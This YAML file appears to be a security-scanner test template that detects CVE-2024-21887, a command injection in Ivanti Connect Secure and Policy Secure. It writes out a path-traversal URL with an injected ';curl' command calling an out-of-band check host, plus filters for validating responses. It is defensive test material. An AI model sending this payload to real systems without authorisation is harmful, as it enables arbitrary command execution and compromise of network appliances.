id: IVANTI_CONNECT_SECURE_COMMAND_INJECTION
info:
  name: "Ivanti Connect Secure and Ivanti Policy Secure - Command Injection"
  description: "This test refers to a vulnerability in Ivanti's secure access and network policy solutions. This flaw allows attackers to execute arbitrary commands on the underlying system by injecting malicious inputs into command fields or parameters. Exploiting this vulnerability could lead to unauthorized access, data compromise, or system control, posing significant risks to the security and integrity of the affected systems."
  details: "This vulnerability occurs when an attacker can inject and execute arbitrary commands through input fields or parameters in the Ivanti Connect Secure and Ivanti Policy Secure systems. This vulnerability arises due to insufficient validation or sanitization of user input. Exploiting this flaw can lead to unauthorized system access, data manipulation, or control over the affected system, compromising its security and operational integrity."
  impact: "The impact of this vulnerability is severe, as it allows attackers to execute arbitrary commands on the affected systems. This can result in unauthorized access to sensitive data, system compromise, and potential control over critical infrastructure. Additionally, it may lead to data breaches, loss of confidentiality, and disruption of service, significantly affecting the security and reliability of the organizationâ€™s network."
  category:
    name: COMMAND_INJECTION
    shortName: Command Injection
    displayName: Command Injection
  subCategory: IVANTI_CONNECT_SECURE_COMMAND_INJECTION
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://twitter.com/trbughunters/status/1283133356922884096"
  cwe:
    - CWE-77
  cve:
    - CVE-2024-21887

api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  url:
    extract: urlVar
execute:
  type: single
  requests:
  - req: 
    - send_ssrf_req:
        url: "https://test-services.akto.io/store_uuid/${random_uuid}"
    - modify_method: GET
    - replace_body: '{}'
    - modify_url: ${urlVar}/api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20https://test-services.akto.io/store_uuid/${random_uuid}
validate:
  ssrf_url_hit: ${random_uuid}
  response_payload:
    length:
      gt: 0
    contains_all:
      - '"result":'
      - '"message":'
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
   